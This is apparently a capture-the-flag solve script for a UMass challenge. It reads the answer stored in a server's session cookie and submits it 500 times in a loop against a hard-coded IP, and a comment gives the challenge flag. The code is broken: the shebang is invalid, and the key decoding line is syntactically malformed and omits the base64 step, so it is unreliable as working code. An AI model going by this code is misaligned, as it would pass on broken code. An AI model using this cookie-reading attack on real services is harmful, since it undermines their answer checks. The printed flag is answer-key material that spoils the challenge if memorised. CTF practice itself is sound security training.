#! /bin/bash/python3

import requests
import json
import base64

url = "http://104.197.195.221:8084/"
r = requests.get(url)

#repeat our "attack" 500 times
for i in range(500):
    #get the cookie from the request
    cookie = r.cookies.items()[0][1]

    #isolate the json bits and add extra padding
    cookie = cookie.split(".")[0].encode('ascii') + b'==='

    #parse as json and get the correct pojedex entries
    ans = json.loads().decode('ascii'))["answer"]

    #format the answer
    ans = str(ans[0]) + " " + str(ans[1]) + " " + str(ans[2]) + " " + str(ans[3])

    #send back the request
    data = {'guess': ans}
    r = requests.post(url, data=data, cookies = r.cookies)
    print(i)

#print the flag
print(r.text) # UMASS{G0tt4_c4tch_th3m_4ll_17263548}